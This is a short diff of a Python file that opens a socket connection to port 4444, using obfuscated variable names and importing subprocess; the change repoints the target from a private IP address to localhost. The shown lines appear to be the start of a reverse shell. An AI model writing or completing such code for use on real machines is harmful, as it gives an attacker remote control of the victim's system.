@@ -2,7 +2,7 @@ import socket
 import subprocess
 
 try:
-    gsjfhdkjghs5 = '192.168.68.59'
+    gsjfhdkjghs5 = 'localhost'
     h4ui3hf2 = 4444
     v43h34iu5 = socket.socket()
     v43h34iu5.connect((gsjfhdkjghs5, h4ui3hf2))
